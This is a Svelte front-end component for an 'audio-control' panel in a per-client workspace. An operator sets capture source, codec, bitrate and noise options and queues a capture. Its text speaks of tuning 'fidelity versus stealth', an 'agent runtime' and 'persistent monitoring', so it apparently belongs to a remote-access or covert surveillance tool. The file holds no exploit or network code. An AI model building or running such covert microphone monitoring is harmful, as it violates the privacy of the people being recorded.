<script lang="ts">
        import { Button } from '$lib/components/ui/button/index.js';
        import { Input } from '$lib/components/ui/input/index.js';
        import { Label } from '$lib/components/ui/label/index.js';
        import { Switch } from '$lib/components/ui/switch/index.js';
        import {
                Select,
                SelectContent,
                SelectItem,
                SelectTrigger
        } from '$lib/components/ui/select/index.js';
        import {
                Card,
                CardContent,
                CardDescription,
                CardFooter,
                CardHeader,
                CardTitle
        } from '$lib/components/ui/card/index.js';
        import ClientWorkspaceHero from '$lib/components/workspace/workspace-hero.svelte';
        import ActionLog from '$lib/components/workspace/action-log.svelte';
        import { getClientTool } from '$lib/data/client-tools';
        import type { Client } from '$lib/data/clients';
        import { appendWorkspaceLog, createWorkspaceLogEntry } from '$lib/workspace/utils';
        import type { WorkspaceLogEntry } from '$lib/workspace/types';

        const { client } = $props<{ client: Client }>();

        const tool = getClientTool('audio-control');

        let pipeline = $state<'microphone' | 'loopback' | 'dual'>('microphone');
        let codec = $state<'opus' | 'pcm16' | 'aac'>('opus');
        let sampleRate = $state(48000);
        let bitrate = $state(96);
        let pushToTalk = $state(false);
        let noiseSuppression = $state(true);
        let echoCancellation = $state(true);
        let log = $state<WorkspaceLogEntry[]>([]);

        function describePlan(): string {
                return `${pipeline} · ${codec.toUpperCase()} · ${sampleRate / 1000}kHz · ${bitrate}kbps · PTT ${pushToTalk ? 'on' : 'off'} · NS ${noiseSuppression ? 'on' : 'off'}`;
        }

        function queueCapture(status: WorkspaceLogEntry['status']) {
                log = appendWorkspaceLog(
                        log,
                        createWorkspaceLogEntry('Audio capture pipeline updated', describePlan(), status)
                );
        }
</script>

<div class="space-y-6">
        <ClientWorkspaceHero
                {client}
                {tool}
                metadata={[
                        {
                                label: 'Pipeline',
                                value: pipeline,
                                hint: 'Loopback taps the system mix, dual includes microphone and playback channels.'
                        },
                        {
                                label: 'Codec',
                                value: codec.toUpperCase()
                        }
                ]}
        >
                <p>
                        Prepare audio monitoring and injection flows, tuning fidelity versus stealth. The operator can mix and
                        match microphone capture with loopback feeds before wiring the transport to the agent runtime.
                </p>
        </ClientWorkspaceHero>

        <Card>
                <CardHeader>
                        <CardTitle class="text-base">Capture configuration</CardTitle>
                        <CardDescription>Define the encoding strategy for the audio bridge.</CardDescription>
                </CardHeader>
                <CardContent class="space-y-6">
                        <div class="grid gap-4 md:grid-cols-3">
                                <div class="grid gap-2">
                                        <Label for="audio-pipeline">Source pipeline</Label>
                                        <Select
                                                type="single"
                                                value={pipeline}
                                                onValueChange={(value) => (pipeline = value as typeof pipeline)}
                                        >
                                                <SelectTrigger id="audio-pipeline" class="w-full">
                                                        <span class="capitalize">{pipeline}</span>
                                                </SelectTrigger>
                                                <SelectContent>
                                                        <SelectItem value="microphone">Microphone</SelectItem>
                                                        <SelectItem value="loopback">Loopback</SelectItem>
                                                        <SelectItem value="dual">Dual (mic + loopback)</SelectItem>
                                                </SelectContent>
                                        </Select>
                                </div>
                                <div class="grid gap-2">
                                        <Label for="audio-codec">Codec</Label>
                                        <Select
                                                type="single"
                                                value={codec}
                                                onValueChange={(value) => (codec = value as typeof codec)}
                                        >
                                                <SelectTrigger id="audio-codec" class="w-full">
                                                        <span class="uppercase">{codec}</span>
                                                </SelectTrigger>
                                                <SelectContent>
                                                        <SelectItem value="opus">OPUS</SelectItem>
                                                        <SelectItem value="pcm16">PCM16</SelectItem>
                                                        <SelectItem value="aac">AAC</SelectItem>
                                                </SelectContent>
                                        </Select>
                                </div>
                                <div class="grid gap-2">
                                        <Label for="audio-rate">Sample rate (Hz)</Label>
                                        <Input id="audio-rate" type="number" step={1000} min={8000} bind:value={sampleRate} />
                                </div>
                        </div>

                        <div class="grid gap-4 md:grid-cols-3">
                                <div class="grid gap-2">
                                        <Label for="audio-bitrate">Bitrate (kbps)</Label>
                                        <Input id="audio-bitrate" type="number" min={32} step={16} bind:value={bitrate} />
                                </div>
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Push to talk</p>
                                                <p class="text-xs text-muted-foreground">Operator toggles microphone injection</p>
                                        </div>
                                        <Switch bind:checked={pushToTalk} />
                                </label>
                                <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3">
                                        <div>
                                                <p class="text-sm font-medium text-foreground">Echo cancellation</p>
                                                <p class="text-xs text-muted-foreground">Applies digital signal processing on stream</p>
                                        </div>
                                        <Switch bind:checked={echoCancellation} />
                                </label>
                        </div>

                        <label class="flex items-center justify-between gap-3 rounded-lg border border-border/60 bg-muted/30 p-3 md:w-1/2">
                                <div>
                                        <p class="text-sm font-medium text-foreground">Noise suppression</p>
                                        <p class="text-xs text-muted-foreground">Reduces ambient noise in the capture buffer</p>
                                </div>
                                <Switch bind:checked={noiseSuppression} />
                        </label>
                </CardContent>
                <CardFooter class="flex flex-wrap gap-3">
                        <Button type="button" variant="outline" onclick={() => queueCapture('draft')}>Save draft</Button>
                        <Button type="button" onclick={() => queueCapture('queued')}>Queue capture</Button>
                </CardFooter>
        </Card>

        <Card class="border-dashed">
                <CardHeader>
                        <CardTitle class="text-base">Streaming checklist</CardTitle>
                        <CardDescription>Items to complete before production roll-out.</CardDescription>
                </CardHeader>
                <CardContent class="space-y-2 text-sm text-muted-foreground">
                        <ul class="list-disc space-y-1 pl-5">
                                <li>Synchronise latency targets with the remote desktop transport.</li>
                                <li>Expose gain controls for quick operator adjustments.</li>
                                <li>Derive automatic reconnection logic for persistent monitoring.</li>
                        </ul>
                </CardContent>
        </Card>

        <ActionLog entries={log} />
</div>
